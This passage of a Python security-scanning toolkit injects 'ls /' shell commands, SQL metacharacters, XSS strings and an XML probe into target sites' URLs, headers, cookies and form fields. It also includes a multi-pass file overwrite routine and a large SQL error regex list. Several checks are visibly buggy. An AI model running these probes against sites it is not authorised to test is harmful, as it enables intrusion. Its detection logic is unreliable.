                            web_list.append(my_secure + url + "/" + clean[0])

                        else:
                            if url in i:
                                web_list.append(clean[0])

                    except:
                        pass

            web_list = list(dict.fromkeys(web_list))

    clear()

    return web_list

#securely destroys data
def secure_overwrite(file):
    clear()

    result = ""
    last_result = ""
    
    progress = 0

    print(red + "preparing")
    
    try:
        with open(file, "rb") as f:
            storage = f.seek(0, 2)

    except PermissionError:
        print(red + "ERROR! Permission denied!")
        exit()

    gb = math.floor(storage / 1000000000)

    for i in range(0, 20000000):
        result += "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

    for i in range(0, storage % 2000000000):
        last_result += "00"

    result = binascii.unhexlify(result)
    last_result = binascii.unhexlify(last_result)
    jk_last_result = binascii.unhexlify("00")

    for i in range(1, 8):
        tracker = 0
        
        try:
            for ii in range(0, gb):
                clear()
                print(red + "pass: " + str(i))
                print(red + "gb: " + str(ii))

                with open(file, "wb+") as f:
                    f.seek(tracker) 
                    f.write(result)
                    tracker += 1000000000
            
        except OSError:
            continue

        try:
            clear()
            print(red + "pass: " + str(i))
            print(red + "gb: " + str(gb))

            with open(file, "wb+") as f:
                f.seek(tracker) 
                f.write(last_result)
                tracker += len(last_result)

        except OSError:
            continue

        try:
            with open(file, "wb+") as f:
                f.seek(tracker) 
                f.write(jk_last_result)
                tracker += 2

        except OSError:
            continue

    clear()
    print(red + file)
    print(red + "done")

#scans for all security flaws    
def security_scanner(url, secure = True, my_file = " "):
    clear()

    my_subdomain_takeover = subdomain_takeover(url, secure, my_file)
    my_shell_injection_scanner = shell_injection_scanner(url, secure)
    my_sql_injection_scanner = sql_injection_scanner(url, secure, my_file)
    my_xss_scanner = xss_scanner(url, secure, my_file)
    my_xxe_scanner = xxe_scanner(url, secure, my_file)

    clear()
    
    print(red + "shell injection:")

    for i in my_shell_injection_scanner:
        print(red + i)

    print("")
    print(red + "sql injection:")

    for i in my_sql_injection_scanner:
        print(red + i)

    print("")
    print(red + "subdomain takeover:")

    for i in my_subdomain_takeover:
        print(red + i)

    print("")
    print(red + "xss:")

    for i in my_xss_scanner:
        print(red + i)

    print("")
    print(red + "xxe:")

    for i in my_xxe_scanner:
        print(red + i)
        
def shell_injection_scanner(url, secure = True):
    clear()
    
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    my_url = my_secure + url
        
    vuln_list = ["boot", "dev", "etc", "mnt", "proc", "root", "run", "tmp", "usr", "var", "opt"]

    comprised_list = []
    false_positives = 0

    user_agent_moded = {"User-Agent" : "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "ls /": "ls /"}

    links = link_scanner(url, secure)

    clear()

    for link in links:
        print(red + "checking user agent: " + link)

        try:
            my_request = web_session.get(link, headers = user_agent_moded, verify = False, timeout = (5,30)).text

            chance = 0

            for i in vuln_list:
                if i in my_request:
                    chance += 1

            if chance == len(vuln_list):
                comprised_list.append(link + " (user agent)")
                print(red + "True: " + link + " (user agent)")

            if link.endswith("/"):
                print(red + "checking uri: " + link + "ls /")
            
                my_request = web_session.get(link + "ls%20%2F", headers = user_agent, verify = False, timeout = (5,30)).text

            else:
                print(red + "checking uri: " + link + "/ls /")
            
                my_request = web_session.get(link + "/ls%20%2F", headers = user_agent, verify = False, timeout = (5,30)).text

            chance = 0

            for i in vuln_list:
                if i in my_request:
                    chance += 1

            if chance == len(vuln_list):
                comprised_list.append(link + " (uri)")
                print(red + "True: " + link + " (uri)")

            print(red + "checking for forms on: " + link)
            clean = link.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                name = str(re.findall("name.+\".+\"", i)).split("\"")
                mal_dict = {name[1] : "ls /"}

                print(red + "checking form: " + str(link) + str(mal_dict))

                get = web_session.get(link, params = mal_dict, headers = user_agent, verify = False, timeout = (5,30)).text
                post = web_session.post(link, data = mal_dict, headers = user_agent, verify = False, timeout = (5,30)).text

                chance = 0

                for i in get:
                    if i in my_request:
                        chance += 1

                for i in post:
                    if i in my_request:
                        chance += 1

                if chance == len(vuln_list):
                    comprised_list.append(link + " " + mal_dict)
                    print(red + "True: " + link + " " + mal_dict)

        except:
            continue

    clear()
    
    return comprised_list

def source_code_viewer(file, keyword = ""):
    clear()

    count = 0
    
    with open(file, "rb") as f:
        for i in f:
            hex_code = str(i).replace("b'", "")
            hex_code = str(hex_code).replace("'", "")
            hex_code = str(hex_code).replace("b\"", "")
            hex_code = str(hex_code).replace("\"", "")
            hex_code = str(hex_code).replace("\\x", "")

            result = str(i, "ascii", errors = "replace")

            if keyword in result or keyword in hex_code:
                print(red + result)
                print(red + hex_code)

                count += 1

                if count == 128:
                    count = 0
                    pause = input()

    print(red + "\ndone")

#scans for sql injection errors
def sql_injection_scanner(url, secure = True, my_file = " "):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    #sql errors
    error_message = {"SQL syntax.*?MySQL", "Warning.*?\Wmysqli?_", "MySQLSyntaxErrorException", "valid MySQL result", "check the manual that (corresponds to|fits) your MySQL server version", "check the manual that (corresponds to|fits) your MariaDB server version", "check the manual that (corresponds to|fits) your Drizzle server version", "Unknown column '[^ ]+' in 'field list'", "MySqlClient\.", "com\.mysql\.jdbc", "Zend_Db_(Adapter|Statement)_Mysqli_Exception", "Pdo\[./_\\]Mysql", "MySqlException", "SQLSTATE\[\d+\]: Syntax error or access violation", "MemSQL does not support this type of query", "is not supported by MemSQL", "unsupported nested scalar subselect", "PostgreSQL.*?ERROR", "Warning.*?\Wpg_", "valid PostgreSQL result", "Npgsql\.", "PG::SyntaxError:", "org\.postgresql\.util\.PSQLException", "ERROR:\s\ssyntax error at or near", "ERROR: parser: parse error at or near", "PostgreSQL query failed", "org\.postgresql\.jdbc", "Pdo\[./_\\]Pgsql", "PSQLException", "OLE DB.*? SQL Server", "\bSQL Server[^&lt;&quot;]+Driver", "Warning.*?\W(mssql|sqlsrv)_", "\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}", "System\.Data\.SqlClient\.(SqlException|SqlConnection\.OnError)", "(?s)Exception.*?\bRoadhouse\.Cms\.", "Microsoft SQL Native Client error '[0-9a-fA-F]{8}", "\[SQL Server\]", "ODBC SQL Server Driver", "ODBC Driver \d+ for SQL Server", "SQLServer JDBC Driver", "com\.jnetdirect\.jsql", "macromedia\.jdbc\.sqlserver", "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception", "com\.microsoft\.sqlserver\.jdbc", "Pdo\[./_\\](Mssql|SqlSrv)", "SQL(Srv|Server)Exception", "Unclosed quotation mark after the character string", "Microsoft Access (\d+ )?Driver", "JET Database Engine", "Access Database Engine", "ODBC Microsoft Access", "Syntax error \(missing operator\) in query expression", "\bORA-\d{5}", "Oracle error", "Oracle.*?Driver", "Warning.*?\W(oci|ora)_", "quoted string not properly terminated", "SQL command not properly ended", "macromedia\.jdbc\.oracle", "oracle\.jdbc", "Zend_Db_(Adapter|Statement)_Oracle_Exception", "Pdo\[./_\\](Oracle|OCI)", "OracleException", "CLI Driver.*?DB2", "DB2 SQL error", "\bdb2_\w+\(", "SQLCODE[=:\d, -]+SQLSTATE", "com\.ibm\.db2\.jcc", "Zend_Db_(Adapter|Statement)_Db2_Exception", "Pdo\[./_\\]Ibm", "DB2Exception", "ibm_db_dbi\.ProgrammingError", "Warning.*?\Wifx_", "Exception.*?Informix", "Informix ODBC Driver", "ODBC Informix driver", "com\.informix\.jdbc", "weblogic\.jdbc\.informix", "Pdo\[./_\\]Informix", "IfxException", "Dynamic SQL Error", "Warning.*?\Wibase_", "org\.firebirdsql\.jdbc", "Pdo\[./_\\]Firebird", "SQLite/JDBCDriver", "SQLite\.Exception", "(Microsoft|System)\.Data\.SQLite\.SQLiteException", "Warning.*?\W(sqlite_|SQLite3::)", "\[SQLITE_ERROR\]", "SQLite error \d+:", "sqlite3.OperationalError:", "SQLite3::SQLException", "org\.sqlite\.JDBC", "Pdo\[./_\\]Sqlite", "SQLiteException", "SQL error.*?POS([0-9]+)", "Warning.*?\Wmaxdb_", "DriverSapDB", "-3014.*?Invalid end of SQL statement", "com\.sap\.dbtech\.jdbc", "\[-3008\].*?: Invalid keyword or missing delimiter", "Warning.*?\Wsybase_", "Sybase message", "Sybase.*?Server message", "SybSQLException", "Sybase\.Data\.AseClient", "com\.sybase\.jdbc", "Warning.*?\Wingres_", "Ingres SQLSTATE", "Ingres\W.*?Driver", "com\.ingres\.gcf\.jdbc", "Exception (condition )?\d+\. Transaction rollback", "com\.frontbase\.jdbc", "Syntax error 1. Missing", "(Semantic|Syntax) error [1-4]\d{2}\.", "Unexpected end of command in statement \[", "Unexpected token.*?in statement \[", "org\.hsqldb\.jdbc", "org\.h2\.jdbc", "\[42000-192\]", "![0-9]{5}![^\n]+(failed|unexpected|error|syntax|expected|violation|exception)", "\[MonetDB\]\[ODBC Driver", "nl\.cwi\.monetdb\.jdbc", "Syntax error: Encountered", "org\.apache\.derby", "ERROR 42X01", ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):", "/vertica/Parser/scan", "com\.vertica\.jdbc", "org\.jkiss\.dbeaver\.ext\.vertica", "com\.vertica\.dsi\.dataengine", "com\.mckoi\.JDBCDriver", "com\.mckoi\.database\.jdbc", "&lt;REGEX_LITERAL&gt;", "com\.facebook\.presto\.jdbc", "io\.prestosql\.jdbc", "com\.simba\.presto\.jdbc", "UNION query has different number of fields: \d+, \d+", "Altibase\.jdbc\.driver", "com\.mimer\.jdbc", "Syntax error,[^\n]+assumed to mean", "io\.crate\.client\.jdbc", "encountered after end of query", "A comparison operator is required here", "-10048: Syntax error", "rdmStmtPrepare\(.+?\) returned", "SQ074: Line \d+:", "SR185: Undefined procedure", "SQ200: No table ", "Virtuoso S0002 Error", "\[(Virtuoso Driver|Virtuoso iODBC Driver)\]\[Virtuoso Server\]"}
    
    #malicious sql code
    mal_sql = ["\"", "\'", ";", "*"]

    my_list = []

    clear()

    my_result = []

    if my_file == " ":
        my_result = link_scanner(url, secure)

    if my_file != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_result.append(clean)

    clear()

    for j in my_result:
        for c in mal_sql:
            new_url = j + c
            print(red + "checking: " + str(new_url))
            
            try:
                result = web_session.get(new_url, verify = False, headers = user_agent, timeout = (5, 30)).text
                
                for i in error_message:
                    my_regex = re.search(i, result)

                    try:
                        if my_regex:
                            print(red + "true: " + str(i) + " " + str(my_regex.span()) + " " + new_url)
                            my_list.append("true: " + str(i) + " " + str(my_regex.span()) + " " + new_url)
                            break

                    except UnicodeDecodeError:
                        break

            except:
                pass

        for c in mal_sql:
            print(red + "checking headers: " + str(j) + " (" + c + ")")

            user_agent_moded = {"User-Agent" : "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", c : c}

            try:
                result = web_session.get(j, verify = False, headers = user_agent_moded, timeout = (5, 30)).text

                for i in error_message:
                    my_regex = re.search(i, result)

                    try:
                        if my_regex:
                            print(red + "true headers: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                            my_list.append("true headers: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                            break

                    except UnicodeDecodeError:
                        break

            except:
                pass

        try:
            print("checking for forms on: " + j)
            clean = j.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                for ii in mal_sql:
                    name = str(re.findall("name.+\".+\"", i)).split("\"")
                    mal_dict = {name[1] : ii}

                    print(red + "checking: " + str(j) + " (" + str(mal_dict) + ")")

                    
                        

                    get = web_session.get(j, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text
                    post = web_session.post(j, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text

                    try:
                        for iii in error_message:
                            get_regex = re.search(iii, result)

                            if get_regex:
                                print(red + "true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                my_list.append("true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                break

                            post_regex = re.search(iii, result)

                            if post_regex:
                                print(red + "true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                my_list.append("true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                break

                    except UnicodeDecodeError:
                        break

        except:
            pass



    my_list = list(dict.fromkeys(my_list))

    clear()
    
    return my_list

def subdomain_scanner(url, secure = True, my_file = " "):
    domain_list = []

    website = []

    if my_file == " ":
        website = link_scanner(url, secure)

    if my_file != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                website.append(clean)

    clear()

    for i in website:
        domain = re.findall("(https://?|http://?)(\S+)" + "." + url, i)

        try:
            result = domain[0][1]
            domain_list.append(result)

        except:
            continue
        
    domain_list = list(dict.fromkeys(domain_list))
    domain_list.sort()

    return domain_list

def subdomain_takeover(url, secure = True, my_file = " "):
    result = subdomain_scanner(url, secure, my_file = my_file)

    clear()

    vuln_list = []

    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"
    
    for i in result:
        my_url = my_secure + str(i) + str(url)

        print("checking: " + my_url)

        try:
            my_request = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30)).status_code

            if my_request == 404:
                print(True)
                vuln_list.append(my_url)

            else:
                print(False)

        except:
            print(False)

    clear()

    return vuln_list

#scans for xss
def xss_scanner(url, secure = True, my_file = " "):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    cyan = "\033[1;36m"
        
    my_list = []
    
    #malicious script
    mal_payloads = ['<scipt>alert("TheSilent")</script>', 'toString(TheSilent)', 'var=TheSilent', 'let=TheSilent', 'const=TheSilent']

    clear()

    my_result = []

    if my_file == " ":
        my_result = link_scanner(url, secure)

    if my_file != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_result.append(clean)

    clear()

    for links in my_result:
        try:
            for mal_script in mal_payloads:      
                my_url = links + mal_script
                print(red + "checking: " + str(my_url)) 

                if links.endswith("/"):
                    my_url = links + mal_script

                if not links.endswith("/"):
                    my_url = links + "/" + scripts

                result = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30))

                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(cyan + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(red + "true: " + my_url)
                        my_list.append(my_url)

        except:
            pass

        
        print(red + "checking: " + str(links) + " (user agent)")  

        try:
            for mal_script in mal_payloads:
                user_agent_moded = {"User-Agent" : "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", mal_script: mal_script}

                result = web_session.get(links, verify = False, headers = user_agent_moded, timeout = (5, 30))
                
                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(cyan + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(red + "true: " + links + " (user agent) " + mal_script)
                        my_list.append(links + " (user agent) " + mal_script)

        except:
            pass

        

        print(red + "checking: " + str(links) + " (cookie)")  

        try:
            for mal_script in mal_payloads:
                mal_cookie = {mal_script: mal_script}

                result = web_session.get(links, verify = False, headers = user_agent, cookies = mal_cookie, timeout = (5, 30))
                
                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(cyan + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(red + "true: " + links + " (cookie) " + mal_script)
                        my_list.append(links + " (cookie) " + mal_script)

        except:
            pass

        try:
            print("checking for forms on: " + links)
            clean = links.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                for mal_script in mal_payloads:
                    name = str(re.findall("name.+\".+\"", i)).split("\"")
                    mal_dict = {name[1] : mal_script}

                    print(red + "checking: " + str(links) + " " + str(mal_dict))

                    get = web_session.get(links, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))
                    post = web_session.post(links, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))

                    if get.status_code == 401 or get.status_code == 403 or get.status_code == 405:
                        print(cyan + "firewall detected")

                    if get.status_code >= 200 and get.status_code < 300:
                        if mal_script in get.text and "404" not in get.text:
                            print(red + "true: " + str(links) + " " + str(mal_dict))
                            my_list.append(str(links) + " " + str(mal_dict))

                    if post.status_code == 401 or post.status_code == 403 or post.status_code == 405:
                        print(cyan + "firewall detected")

                    if post.status_code >= 200 and post.status_code < 300:
                        if mal_script in post.text and "404" not in post.text:
                            print(red + "true: " + str(links) + " " + str(mal_dict))
                            my_list.append(str(links) + " " + str(mal_dict))

        except:
            pass

    my_list = list(dict.fromkeys(my_list))
    my_list.sort()

    clear()

    my_list = list(dict.fromkeys(my_list))
    my_list.sort()

    return my_list

#scans for xxe
def xxe_scanner(url, secure = True, my_file = " "):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    mal_script = '<?xml version = "1.0"?>'
    my_list = []

    my_result = []

    if my_file == " ":
        my_result = link_scanner(url, secure)

    if my_file != " ":
        with open(my_file, "r", errors = "ignore") as file:
            for i in file:
                clean = i.replace("\n", "")
                my_result.append(clean)

    clear()

    for links in my_result:
        new_url = links + mal_script
        print(red + "checking: " + str(new_url))
            

        try:
            result = web_session.get(new_url, verify = False, headers = user_agent, timeout = (5, 30)).text
            
            if mal_script in result:
                print(red + "true: " + new_url)
                my_list.append("true: " + new_url)

        except:
            pass

        try:
            print("checking for forms on: " + links)
            clean = links.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                name = str(re.findall("name.+\".+\"", i)).split("\"")
                mal_dict = {name[1] : mal_script}

                print(red + "checking: " + str(links) + " (" + str(mal_dict) + ")")

                get = web_session.get(links, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text
                post = web_session.post(links, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text

                if mal_script in get:
                    print(red + "true: " + str(links) + " " + str(mal_dict))
                    my_list.append("true: " + str(links) + " " + str(mal_dict))

                if mal_script in post:
                    print(red + "true: " + str(links) + " " + str(mal_dict))
                    my_list.append("true: " + str(links) + " " + str(mal_dict))

        except:
            pass

    my_list = list(dict.fromkeys(my_list))
    my_list.sort()

    clear()

    return my_list
